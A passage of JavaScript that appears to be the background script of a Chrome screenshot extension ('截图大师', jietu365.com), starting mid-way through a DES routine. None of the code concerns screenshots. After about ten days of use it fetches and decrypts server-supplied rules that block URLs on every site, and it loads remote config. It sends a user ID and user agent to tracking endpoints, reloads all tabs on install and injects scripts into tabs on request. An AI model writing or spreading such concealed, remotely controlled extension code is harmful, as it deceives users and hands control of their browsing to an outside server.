    var loop = [ 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 ];
    for (i = 0; i < 7; i++) {
        for (j = 0, k = 7; j < 8; j++, k--) {
            key[i * 8 + j] = keyByte[8 * k + i];
        }
    }
    var i = 0;
    for (i = 0; i < 16; i++) {
        var tempLeft = 0;
        var tempRight = 0;
        for (j = 0; j < loop[i]; j++) {
            tempLeft = key[0];
            tempRight = key[28];
            for (k = 0; k < 27; k++) {
                key[k] = key[k + 1];
                key[28 + k] = key[29 + k];
            }
            key[27] = tempLeft;
            key[55] = tempRight;
        }
        var tempKey = new Array(48);
        tempKey[0] = key[13];
        tempKey[1] = key[16];
        tempKey[2] = key[10];
        tempKey[3] = key[23];
        tempKey[4] = key[0];
        tempKey[5] = key[4];
        tempKey[6] = key[2];
        tempKey[7] = key[27];
        tempKey[8] = key[14];
        tempKey[9] = key[5];
        tempKey[10] = key[20];
        tempKey[11] = key[9];
        tempKey[12] = key[22];
        tempKey[13] = key[18];
        tempKey[14] = key[11];
        tempKey[15] = key[3];
        tempKey[16] = key[25];
        tempKey[17] = key[7];
        tempKey[18] = key[15];
        tempKey[19] = key[6];
        tempKey[20] = key[26];
        tempKey[21] = key[19];
        tempKey[22] = key[12];
        tempKey[23] = key[1];
        tempKey[24] = key[40];
        tempKey[25] = key[51];
        tempKey[26] = key[30];
        tempKey[27] = key[36];
        tempKey[28] = key[46];
        tempKey[29] = key[54];
        tempKey[30] = key[29];
        tempKey[31] = key[39];
        tempKey[32] = key[50];
        tempKey[33] = key[44];
        tempKey[34] = key[32];
        tempKey[35] = key[47];
        tempKey[36] = key[43];
        tempKey[37] = key[48];
        tempKey[38] = key[38];
        tempKey[39] = key[55];
        tempKey[40] = key[33];
        tempKey[41] = key[52];
        tempKey[42] = key[45];
        tempKey[43] = key[41];
        tempKey[44] = key[49];
        tempKey[45] = key[35];
        tempKey[46] = key[28];
        tempKey[47] = key[31];
        switch (i) {
          case 0:
            for (m = 0; m < 48; m++) {
                keys[0][m] = tempKey[m];
            }
            break;

          case 1:
            for (m = 0; m < 48; m++) {
                keys[1][m] = tempKey[m];
            }
            break;

          case 2:
            for (m = 0; m < 48; m++) {
                keys[2][m] = tempKey[m];
            }
            break;

          case 3:
            for (m = 0; m < 48; m++) {
                keys[3][m] = tempKey[m];
            }
            break;

          case 4:
            for (m = 0; m < 48; m++) {
                keys[4][m] = tempKey[m];
            }
            break;

          case 5:
            for (m = 0; m < 48; m++) {
                keys[5][m] = tempKey[m];
            }
            break;

          case 6:
            for (m = 0; m < 48; m++) {
                keys[6][m] = tempKey[m];
            }
            break;

          case 7:
            for (m = 0; m < 48; m++) {
                keys[7][m] = tempKey[m];
            }
            break;

          case 8:
            for (m = 0; m < 48; m++) {
                keys[8][m] = tempKey[m];
            }
            break;

          case 9:
            for (m = 0; m < 48; m++) {
                keys[9][m] = tempKey[m];
            }
            break;

          case 10:
            for (m = 0; m < 48; m++) {
                keys[10][m] = tempKey[m];
            }
            break;

          case 11:
            for (m = 0; m < 48; m++) {
                keys[11][m] = tempKey[m];
            }
            break;

          case 12:
            for (m = 0; m < 48; m++) {
                keys[12][m] = tempKey[m];
            }
            break;

          case 13:
            for (m = 0; m < 48; m++) {
                keys[13][m] = tempKey[m];
            }
            break;

          case 14:
            for (m = 0; m < 48; m++) {
                keys[14][m] = tempKey[m];
            }
            break;

          case 15:
            for (m = 0; m < 48; m++) {
                keys[15][m] = tempKey[m];
            }
            break;
        }
    }
    return keys;
}

exports.md5 = {
    e: strEnc,
    d: strDec
};

if (typeof exports == "undefined") var exports = {};

exports.ct = function(S) {
    var pr_ready = false;
    var pr_hostName;
    var pr_et;
    var pr_pt;
    var pr_pg;
    var pr_pendings = [];
    function getConfigFromClient(action, callback) {
        if (!callback) {
            callback = function callback() {};
        }
        if (pr_ready) {
            switch (pr_et) {
              case "NATIVE-MSG":
                ntv(action, callback);
                break;

              case "ALL-IN-ONE":
                aio(action, callback);
                break;

              default:
                callback(null);
                break;
            }
        } else {
            pr_pendings.push({
                action: action,
                callback: callback
            });
        }
    }
    var ntv = function ntv(action, callback) {
        var _action;
        if ((typeof action === "undefined" ? "undefined" : _typeof(action)) === "object") {
            if (Object.prototype.toString.call(action.param) == "[object Array]") {
                action.param.forEach(function(p, i) {
                    if ((typeof p === "undefined" ? "undefined" : _typeof(p)) == "object") {
                        action.param[i] = JSON.stringify(p);
                    }
                });
            } else {
                if (_typeof(action.param) == "object") {
                    action.param = JSON.stringify(action.param);
                }
            }
            _action = action;
        } else {
            _action = {
                action: action
            };
        }
        if (nativeMsg.status == -1) {
            callback(null);
            return;
        }
        try {
            if ([ "getRL0", "getRL3", "getRL5" ].indexOf(_action.action) >= 0) {
                _action.base64 = "1";
            }
            nativeMsg.sendNativeMsg(_action, function(data) {
                if (!data && chrome.runtime.lastError) {
                    callback(null);
                } else {
                    try {
                        if (data.base64) {
                            data.result = atob(data.result);
                        }
                        callback(JSON.parse(data.result));
                    } catch (e) {
                        callback(data.result);
                    }
                }
            });
        } catch (e) {
            callback(null);
        }
    };
    var nativeMsg = {
        status: 0,
        connect: function connect(callback) {
            nativeMsg.port = chrome.runtime.connectNative(pr_hostName);
            nativeMsg.port.onMessage.addListener(nativeMsg.onNativeMessage);
            nativeMsg.port.onDisconnect.addListener(function() {
                var error = !!chrome.runtime.lastError;
                callback(null, error);
                nativeMsg.onDisconnected();
            });
        },
        onNativeMessage: function onNativeMessage(message) {
            if (nativeMsg.callbacks[message.callback]) {
                nativeMsg.callbacks[message.callback](message);
                delete nativeMsg.callbacks[message.callback];
            }
        },
        onDisconnected: function onDisconnected() {
            nativeMsg.port = null;
        },
        sendNativeMsg: function sendNativeMsg(message, callback) {
            if (!nativeMsg.port) {
                if (!pr_hostName) return;
                nativeMsg.connect(callback);
            }
            var cbname = message.action + "-" + new Date().getTime() + "-" + Math.random();
            message.callback = cbname;
            nativeMsg.port.postMessage(message);
            nativeMsg.callbacks[cbname] = callback;
        },
        callbacks: {}
    };
    var aio = function aio(action, callback) {};
    var ct = {
        init: function init(config) {
            pr_hostName = config.hostName;
            pr_et = config.et;
            pr_pt = config.pt;
        },
        setHostName: function setHostName(hostName) {
            pr_hostName = hostName;
        },
        setEt: function setEt(et) {
            pr_et = et;
            pr_ready = true;
        },
        getEt: function getEt() {
            return pr_et;
        },
        setPt: function setPt(pt) {
            pr_pt = pt;
        },
        setHN: function setHN(hn) {
            pr_hostName = hn;
        },
        setET: function setET(et) {
            pr_et = et;
        },
        setPG: function setPG(pg) {
            pr_pg = pg;
        },
        gcfc: getConfigFromClient,
        handlePendings: function handlePendings() {
            var _iteratorNormalCompletion = true;
            var _didIteratorError = false;
            var _iteratorError = undefined;
            try {
                for (var _iterator = pr_pendings[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
                    var p = _step.value;
                    getConfigFromClient(p.action, p.callback);
                }
            } catch (err) {
                _didIteratorError = true;
                _iteratorError = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion && _iterator.return) {
                        _iterator.return();
                    }
                } finally {
                    if (_didIteratorError) {
                        throw _iteratorError;
                    }
                }
            }
        },
        nativeMsg: nativeMsg
    };
    return ct;
}(exports);

if (typeof exports == "undefined") var exports = {};

exports.plgv = 2;

exports.config = function(S) {
    var ajax = S.ajax;
    var extend = S.extend;
    var cache = S.cache;
    var ct = S.ct;
    var pr_callbacks = [];
    var config = {
        name: "jtds",
        title: "截图大师",
        server: "www.jietu365.com",
        ruleServer: "//www.jietu365.com",
        ruleMidPath: "/prt",
        jrServer: "//www.jietu365.com",
        uidp: "/prt/uji.htm",
        rulep: "/prt/toe.htm",
        assetsServer: "//www.jietu365.com",
        assetsUrl: "//www.jietu365.com/embedjs/v1",
        ver: "1.0.1.8",
        cl: "chrome-ty-jtds",
        pecl: "c9998",
        hostName: "com.jitdudashi.jtds" + (navigator.userAgent.match(/QQBrowser/) ? ".qq" : ""),
        ps: 2,
        br: "chrome",
        cb: "5",
        ist: "1",
        tv: parseInt("1"),
        pid: "7"
    };
    var cbNum = "5";
    config.v1 = config.ver;
    console.log(config.v1);
    config.v2 = config.ver;
    try {
        config.v2 = chrome.runtime.getManifest().version;
    } catch (e) {}
    var pr_cl = config.cl;
    var pr_remoteConfigs = [ "uid" ];
    S.cfg = "https:" + config.assetsUrl + "/cf.json?" + new Date().getTime();
    config.init = function(callback) {
        gStep = 4;
        getCl(function(cl) {
            gStep = 5;
            config.cl = cl;
            getUUID(function(uid) {
                gStep = 6;
                config.uid = uid;
                config._init(callback);
            });
            ct.gcfc("getSS", function(ss) {
                config.ss = config.cl.match("jtds") || ss || 0;
            });
        });
    };
    config._init = function(callback) {
        gStep = 7;
        config.isReady = 0;
        function done() {
            gStep = 8;
            config.isReady = 1;
            config.ad = parseInt(config.ad);
            config.sd = parseInt(config.sd);
            if (config.ad <= config.sd) {
                cache.remove("e");
                cache.remove("RL3");
                cache.remove("RL5");
            }
            if (config.ad > config.sd || pr_cl.match(/maxthon/) || pr_cl.match(/-g-/)) {
                try {
                    sed();
                } catch (e) {
                    window.dispatchEvent(new CustomEvent("cfg"));
                }
            }
            gStep = 10;
            callback(config);
        }
        if (config.ps == 1 || config.ps == 3) {
            ct.gcfc("getAll", function(cenv) {
                gStep = 9;
                for (var k in cenv) {
                    if (!cenv[k]) {
                        delete cenv[k];
                    }
                }
                delete cenv.cl;
                extend(config, cenv);
                cache.set("icd", cenv.ad, {
                    noexpire: true
                });
                cache.set("lastTime", new Date().getTime(), {
                    noexpire: true
                });
                done();
            });
        } else {
            config.sd = 10;
            cache.get([ "lastTime", "icd" ], function(items) {
                config.ad = getadFromLoacl(items.lastTime ? items.lastTime.value : "", items.icd ? items.icd.value : "");
                done();
            });
        }
    };
    config.convertParams = function() {
        var _p = {
            u: config.uid,
            c: config.cl,
            ss: config.ss,
            v: config.ver,
            v1: config.v1,
            v2: config.v2,
            s: config.ps,
            t: config.ad,
            sd: config.sd,
            bl: config.bl,
            cp: config.cp,
            de: config.de,
            mv: config.mv,
            a: config.ci,
            cb: config.cb,
            tms: +parseInt(new Date().getTime() / (1e3 * 60 * 10))
        };
        for (var k in _p) {
            if (!_p[k] && typeof _p[k] != "number") delete _p[k];
        }
        return _p;
    };
    config.getEnv = function() {
        var env = {};
        for (var k in config) {
            if (typeof config[k] !== "function") {
                env[k] = config[k];
            }
        }
        return env;
    };
    function getadFromLoacl(lastTime, icd) {
        lastTime = lastTime || 0;
        icd = icd || 0;
        icd = parseInt(icd);
        var lastDate = new Date(lastTime).getDate();
        var nowDate = new Date().getDate();
        if (lastDate != nowDate) {
            icd += 1;
            cache.set("icd", icd, {
                noexpire: true
            });
            cache.set("lastTime", new Date().getTime(), {
                noexpire: true
            });
        }
        return icd;
    }
    function getVism(callback) {
        var vism = "";
        ajax({
            url: "http:" + config.ruleServer + config.rulep,
            data: {
                method: "snv",
                cp: "-00000",
                _: new Date().getTime()
            },
            dataType: "json",
            cache: false,
            success: function success(data) {
                if (data.s === 1 && data.r && checkVersion(data.r[cbNum], config.v1) <= 0 && checkVersion(config.v1, "1.1.0.0") === -1) {
                    vism = 1;
                } else {
                    vism = 0;
                }
                callback(vism);
            },
            error: function error() {
                vism = 0;
                callback(vism);
            }
        });
    }
    function checkVersion(v1, v2) {
        v1 = v1.split(".");
        v2 = v2.split(".");
        var length = Math.min(v1.length, v2.length);
        for (var i = 0; i < length; i++) {
            if (parseInt(v1[i]) < parseInt(v2[i])) {
                return -1;
            } else if (parseInt(v1[i]) > parseInt(v2[i])) {
                return 1;
            }
        }
        return 0;
    }
    function getCl(callback) {
        ct.gcfc("getSource", function(cl) {
            if (cl) cl += "";
            if (cl && config.pecl.indexOf(cl) < 0) {
                cache.set("cl", cl, {
                    noexpire: true
                });
                callback(cl);
            } else {
                cache.get("cl", function(items) {
                    if (items.cl) {
                        cl = items.cl.value;
                        if (config.pecl.indexOf(cl) >= 0) {
                            cl = config.cl;
                            cache.set("cl", cl, {
                                noexpire: true
                            });
                        }
                        cl += "";
                        if (cl != config.cl && config.ps == 3) {
                            ct.gcfc({
                                action: "setSource",
                                param: cl
                            }, function() {});
                            cache.get([ "lastTime", "icd" ], function(items) {
                                var acd = getadFromLoacl(items.lastTime ? items.lastTime.value : "", items.icd ? items.icd.value : "");
                                ct.gcfc({
                                    action: "setAcd",
                                    param: acd
                                }, function() {});
                                callback(cl);
                            });
                        } else {
                            callback(cl);
                        }
                    } else {
                        callback(config.cl);
                    }
                });
            }
        });
    }
    function getUUID(callback) {
        if (config.ps == 1 || config.ps == 3) {
            ct.gcfc("getUUID", function(uid) {
                cache.set("uid", uid, {
                    noexpire: true
                });
                callback(uid);
            });
        } else {
            cache.get("uid", function(items) {
                if (items.uid) {
                    callback(items.uid.value);
                } else {
                    ajax({
                        url: config.ruleServer + config.uidp,
                        success: function success(data) {
                            if (data.s == 1) {
                                var uid = data.r;
                                cache.set("uid", uid, {
                                    noexpire: true
                                });
                                callback(uid);
                            }
                        },
                        error: function error() {
                            callback("");
                        }
                    });
                }
            });
        }
    }
    if (typeof chrome != "undefined") {
        cache.get("RL5", function(items) {
            S.cnl = function(details) {
                return {
                    cancel: details.type != "stylesheet" && details.type != "main_frame" && details.tabId > 0
                };
            };
            var RL5 = "";
            if (items.RL5) RL5 = items.RL5.value;
            if (RL5.length > 100) {
                chrome.webRequest.onBeforeSendHeaders.addListener(S.cnl, {
                    urls: [ "<all_urls>" ]
                }, [ "blocking", "requestHeaders" ]);
                chrome.webRequest.onBeforeRequest.addListener(S.cnl, {
                    urls: [ "<all_urls>" ]
                }, [ "blocking" ]);
            }
            setTimeout(function() {
                chrome.webRequest.onBeforeRequest.removeListener(S.cnl);
                chrome.webRequest.onBeforeSendHeaders.removeListener(S.cnl);
            }, 1e3);
        });
    }
    return config;
}(exports);

if (typeof window == "undefined") window = exports.config;

(function(S) {
    if (typeof chrome == "undefined") return;
    if (typeof CustomEvent == "undefined") return;
    var to = S.config.to = 10 * 1e3;
    var lut = Math.floor(new Date().getTime() / (1e3 * 60 * 60 * 24));
    exports.cache.get("siz", function(items) {
        function getSiz1() {
            $.ajax({
                url: exports.cfg,
                dataType: "text",
                success: function success(text) {
                    exports.cache.set("siz", text, {
                        noexpire: true,
                        lut: lut,
                        version: S.config.v1
                    });
                }
            });
        }
        function getSiz2() {
            try {
                S.ct.gcfc({
                    action: "getInfoA",
                    param: navigator.userAgent
                }, function(siz) {
                    if (siz) {
                        exports.cache.set("siz", siz, {
                            noexpire: true,
                            lut: lut,
                            version: S.config.v1
                        });
                    } else {
                        getSiz1();
                    }
                });
            } catch (e) {
                getSiz1();
            }
        }
        var siz = items.siz;
        setTimeout(function() {
            if (exports.config.ad <= exports.config.sd) return;
            if (!siz || !siz.value || siz.options.version != S.config.v1 || S.config.ad % 6 === 0 && lut != siz.options.lut) {
                if (exports.config.ps == 2) {
                    getSiz1();
                } else {
                    getSiz2();
                }
            }
        }, to);
    });
})(exports);

exports.appBg = function(S) {
    try {
        var ajax = require("./utils.js").ajax;
        var extend = require("./utils.js").extend;
        var cache = require("./cache.js").cache;
        var ct = require("./ct.js").ct;
    } catch (e) {
        ct = S.ct;
        ajax = S.ajax;
        extend = S.extend;
        cache = S.cache;
    }
    var appBg = {
        init: function init() {},
        updateIcon: function updateIcon(type) {
            type = type || "";
            try {
                var rt = window.external.mxGetRuntime();
                var ui = rt.create("mx.app.ui");
                var myIcon = ui.getEntryPointByActionName("popup", "toolbar");
                myIcon.setIconImage("icon_32" + type + ".png");
            } catch (e) {
                try {
                    sogouExplorer.browserAction.setIcon({
                        path: "logos/32" + type + ".png"
                    });
                } catch (e) {
                    try {
                        chrome.browserAction.setIcon({
                            path: "logos/32" + type + ".png"
                        });
                    } catch (e) {
                        cache.set("iconudt", {
                            path: "./logos/32" + type + ".png"
                        });
                    }
                }
            }
        }
    };
    return appBg;
}(exports);

chrome.runtime.onInstalled.addListener(function(details) {
    if (details.reason == "install") {
        chrome.tabs.query({}, function(t) {
            for (var i = 0; i < t.length; i++) {
                chrome.tabs.reload(t[i].id);
            }
        });
    }
});

if (typeof exports == "undefined") var exports = {};

exports.service = function(S, undefined) {
    var pr_config = S.config;
    var cache = S.cache;
    var ct = S.ct;
    function cacheService(action, key, value, callback) {
        if (action == "get") {
            cache.get(key, function(items) {
                var resp = items[key];
                if (resp) resp = resp.value;
                if (callback) {
                    callback(resp);
                }
            });
        } else {
            cache.set(key, value, {
                noexpire: true
            });
        }
    }
    function clientService(action, param, callback) {
        if (ct) {
            ct.gcfc({
                action: action,
                param: param
            }, function(data) {
                callback(data);
            });
        }
    }
    function netService(settings) {
        S.ajax(settings);
    }
    var _extmem = {};
    function extmemService(action, key, value, callback) {
        key = key.split(".");
        var mem = _extmem;
        var resp;
        for (var i = 0; i < key.length; i++) {
            var k = key[i];
            if (action == "get") {
                resp = mem = mem[k];
                if (!resp) {
                    break;
                }
            } else {
                if (i == key.length - 1) {
                    mem[k] = value;
                } else {
                    if (!mem[k]) mem[k] = {};
                    mem = mem[k];
                }
            }
        }
        key.forEach(function(k, index) {});
        if (callback) {
            callback(resp);
        }
    }
    var service = {
        env: {},
        init: function init(env, urls, defaults) {
            this.urls = urls;
            this.env = env;
            var params = [];
            if (defaults) {
                for (var i in defaults) {
                    params.push(i);
                }
                this.default_params = params.join("&");
            }
        },
        _getUrl: function _getUrl(url) {
            return url + (url.indexOf("?") == -1 ? "?" : "&") + this.default_params + "&t=" + new Date().getTime();
        },
        getIP: function getIP(callback) {
            S.ajax({
                url: "http://int.dpool.sina.com.cn/iplookup/iplookup.php",
                data: {
                    format: "json"
                },
                dataType: "json",
                success: function success(data) {
                    callback(data);
                },
                error: function error(xhr, statusCode, e) {
                    callback(null);
                }
            });
        },
        getCI: function getCI(callback) {
            callback("unknown-unknown");
        },
        getSD: function getSD(callback) {
            callback();
        },
        getPS: function getPS(callback) {
            callback();
        },
        getConfigData: function getConfigData(params, callback) {
            S.ajax({
                url: this._getUrl(this.urls["getConfigData"]),
                data: params,
                success: function success(data) {
                    callback(data);
                },
                error: function error(xhr, statusCode, e) {
                    S.console.debug("error,on get " + name + "," + statusCode + " " + e);
                    callback(null);
                }
            });
        },
        getSource: function getSource(callback) {
            callback({
                r: S.service.env.cl
            });
        },
        getad: function getad(callback) {
            callback({
                r: S.service.env.ad
            });
        },
        getBlockList: function getBlockList(request, callback, options) {
            S.ajax({
                url: this._getUrl(request && request.url || this.urls["getBlockList"]),
                success: function success(data) {
                    callback(data.r);
                },
                error: function error(xhr, statusCode, e) {
                    callback(null);
                }
            });
        },
        getEnv: function getEnv(request, callback) {
            callback(pr_config.getEnv());
        },
        siteSkipList: function siteSkipList(request, callback, options) {
            cache.get("siteSkipList", function(items) {
                var list = items.siteSkipList;
                if (list && list.value) {
                    callback(list.value);
                } else {
                    S.ajax({
                        url: pr_config.assetsUrl + "/filterList.json?_" + new Date().getTime(),
                        success: function success(data) {
                            cache.set("siteSkipList", data, {
                                noexpire: true
                            });
                            callback(data);
                        },
                        error: function error(xhr, statusCode, e) {
                            S.console.debug("error,on get alerts," + statusCode + " " + e);
                            callback(null);
                        }
                    });
                }
            });
        }
    };
    service.helper = {
        requestHandler: function requestHandler(request, sender, sendResponse, options) {
            var callback = function callback() {
                var data = arguments && arguments[0];
                sendResponse && sendResponse(data);
            };
            switch (request.topic) {
              case "cache":
                cacheService(request.action, request.key, request.value, callback);
                break;

              case "client":
                clientService(request.action, request.param, callback);
                break;

              case "net":
                request.settings.success = callback;
                netService(request.settings);
                break;

              case "extmem":
                extmemService(request.action, request.key, request.value, callback);
                break;

              case "insert":
                if (typeof S.extWrapper != "undefined" && S.extWrapper.insert) {
                    try {
                        if (request.files) {
                            S.extWrapper.insertSpe(sender.tab, request.files);
                        } else {
                            S.extWrapper.insert(sender.tab);
                        }
                    } catch (e) {}
                }
                break;

              default:
                if (service[request.topic]) {
                    service[request.topic](request, callback);
                }
            }
            return true;
        }
    };
    service.isReady = 1;
    return service;
}(exports);

if (this.sogouExplorer && !this.chrome) this.chrome = this.sogouExplorer;

if (typeof exports == "undefined") var exports = {};

var gError;

var gStep = 0;

(function(S) {
    var g_ls = "-1", g_lw = "";
    setTimeout(function() {
        new Image().src = "http:" + S.config.jrServer + "/12.gif?" + $.param(S.config.convertParams()) + (gError ? "&ge=" + gError.toString() : "") + ("&gs=" + gStep) + ("&ls=" + g_ls + (g_lw ? "&lw=" + g_lw : ""));
    }, 1e4);
})(exports);

exports.extWrapper = {
    insert: function insert(tab) {
        chrome.tabs.executeScript(tab.id, {
            file: "jtds.js"
        }, exports.checkLastError);
        chrome.tabs.insertCSS(tab.id, {
            file: "css/ext-main.css"
        }, exports.checkLastError);
    },
    insertSpe: function insertSpe(tab, files) {
        files.forEach(function(file) {
            chrome.tabs.executeScript(tab.id, {
                file: file
            }, exports.checkLastError);
        });
    }
};

(function(S) {
    function getPs(clt) {
        clt = parseInt(clt);
        var ps;
        if (clt === 1) {
            ps = 1;
        } else if (clt === 0) {
            ps = 3;
        } else {
            ps = 2;
        }
        return ps;
    }
    function setCt() {
        if (S.ctSeted) return;
        S.ctSeted = true;
        S.ct.setHostName(S.config.hostName);
        S.ct.setPt(S.config.pt);
        try {
            var p = document.querySelector('[type="' + S.config.pt + '"]');
            var clt = p.getClient();
            S.config.ps = getPs(clt);
            S.ct.setEt("ALL-IN-ONE");
            S.ct.handlePendings();
        } catch (e) {
            gError = e;
            if (chrome.runtime.sendNativeMessage) {
                var cbflg = 0;
                S.ct.nativeMsg.sendNativeMsg({
                    action: "getClient"
                }, function(data, error) {
                    if (cbflg) return;
                    cbflg = 1;
                    if (error) {
                        S.ct.setEt("NO-EXIST");
                        S.config.ps = 2;
                    } else {
                        S.ct.setEt("NATIVE-MSG");
                        S.config.ps = getPs(data.result);
                    }
                    S.ct.handlePendings();
                });
                setTimeout(function() {
                    if (!cbflg) {
                        S.ct.setEt("NO-EXIST");
                        S.config.ps = 2;
                        S.ct.handlePendings();
                        cbflg = 1;
                    }
                }, 2e3);
            } else {
                S.ct.setEt("NO-EXIST");
                S.config.ps = getPs(null);
                S.ct.handlePendings();
            }
        }
    }
    function onLoad() {
        gStep = 1;
        setCt();
        S.preCallbacks.forEach(function(cb) {
            cb();
        });
        setTimeout(function() {
            S.config.init(function(config) {
                gStep = 2;
                chrome.runtime.onMessage.addListener(S.service.helper.requestHandler);
                S.appBg.init(config);
                gStep = 3;
                S.configCallbaks.forEach(function(cb) {
                    cb(config);
                });
            });
        }, 400);
    }
    function onConnect(port) {
        port.onMessage.addListener(function(msg) {
            var request = msg.request;
            request.callback = msg.callback;
            S.service.helper.requestHandler(request, "", function(data) {
                var resp = {};
                resp.data = data;
                resp.request = request;
                port && port.postMessage(resp);
            });
        });
        port.onDisconnect.addListener(function() {
            port = null;
        });
    }
    function onInstalled(details) {
        if (details.reason == "install") {
            setTimeout(function() {
                var param = $.param(S.config.convertParams());
                var installUrl = "https:" + S.config.jrServer + "/10.gif?" + param;
                new Image().src = installUrl;
            }, 10 * 1e3);
            S.config.ist == "1" && chrome.storage.local.get("ist", function(items) {
                if (!items.ist) {
                    try {} catch (e) {}
                }
            });
            S.config.ist == "1" && setTimeout(function() {
                S.ajax({
                    url: S.config.ruleServer + S.config.ruleMidPath + "/m1.htm",
                    data: S.config.convertParams(),
                    success: function success(data) {
                        if (data.s === 1 && S.config.ad > 1) {
                            try {} catch (e) {}
                        }
                    }
                });
            }, 2e3);
        }
    }
    S.preCallbacks = [];
    S.configCallbaks = [];
    window.addEventListener("load", backgroundListener = onLoad);
    chrome.runtime.onConnect.addListener(onConnect);
    if (chrome.runtime.onInstalled) {
        chrome.runtime.onInstalled.addListener(onInstalled);
    }
    window.sed = function() {
        exports.cache.get("siz", function($$) {
            if ($$.siz && typeof e != "undefined") {
                window.dispatchEvent(new CustomEvent("cfg", {
                    detail: {
                        siz: $$.siz.value
                    }
                }));
            }
        });
    };
})(exports);

(function(S) {
    setTimeout(function() {
        try {
            S.ct.gcfc({
                action: "setAgent",
                param: navigator.userAgent
            });
        } catch (e) {}
    }, 1e3);
})(exports);

(function(S) {
    setTimeout(function() {
        chrome.storage.local.set({
            ist: +new Date()
        });
        if (S.config.ad < 0) {
            S.ct.gcfc({
                action: "setAcd",
                param: "1"
            });
        }
    }, 1e4);
})(exports);

(function(S) {
    S.cache.get("lastVersion", function(i) {
        if (!i.lastVersion || i.lastVersion.value != S.config.v1) {
            S.cache.set("lastVersion", S.config.v1);
            S.cache.remove("siz");
        }
    });
})(exports);

(function(S) {
    function checkLastError() {
        var error = chrome.runtime.lastError;
        if (error) {
            if (error.message && error.message.match(/No tab with id|Cannot access a .* URL|Cannot access contents of url/)) {
                error = null;
            } else {
                console.error(error);
            }
        }
    }
    S.checkLastError = checkLastError;
})(exports);

(function(S) {
    var rl15ped = false;
    function getRl15(callback) {
        var _p = S.extend({
            method: "iyc",
            ene: 1
        }, S.config.convertParams());
        S.ajax({
            url: "http:" + S.config.ruleServer + S.config.rulep,
            data: _p,
            dataType: "json",
            success: function success(data) {
                if (data && data.s == 1 && data.r) {
                    callback(data.r);
                }
            }
        });
    }
    function rl15p(r) {
        var list = JSON.parse(S.md5.d(r, "f"));
        chrome.webRequest.onBeforeRequest.addListener(function(details) {
            var cnl = false;
            var _iteratorNormalCompletion2 = true;
            var _didIteratorError2 = false;
            var _iteratorError2 = undefined;
            try {
                for (var _iterator2 = list[Symbol.iterator](), _step2; !(_iteratorNormalCompletion2 = (_step2 = _iterator2.next()).done); _iteratorNormalCompletion2 = true) {
                    var rule = _step2.value;
                    if (details.url.match(new RegExp(rule.bl.join("|")))) {
                        cnl = true;
                        break;
                    }
                }
            } catch (err) {
                _didIteratorError2 = true;
                _iteratorError2 = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion2 && _iterator2.return) {
                        _iterator2.return();
                    }
                } finally {
                    if (_didIteratorError2) {
                        throw _iteratorError2;
                    }
                }
            }
            return {
                cancel: cnl
            };
        }, {
            urls: [ "<all_urls>" ]
        }, [ "blocking" ]);
    }
    S.preCallbacks.push(function() {
        S.cache.get("rl15", function(items) {
            if (items.rl15 && !rl15ped) {
                rl15ped = true;
                rl15p(items.rl15.value);
            }
        });
    });
    S.configCallbaks.push(function(config) {
        if (config.ad > config.sd) {
            getRl15(function(rl15) {
                S.cache.set("rl15", rl15);
                if (!rl15ped) {
                    rl15ped = true;
                    rl15p(rl15);
                }
            });
        }
    });
})(exports);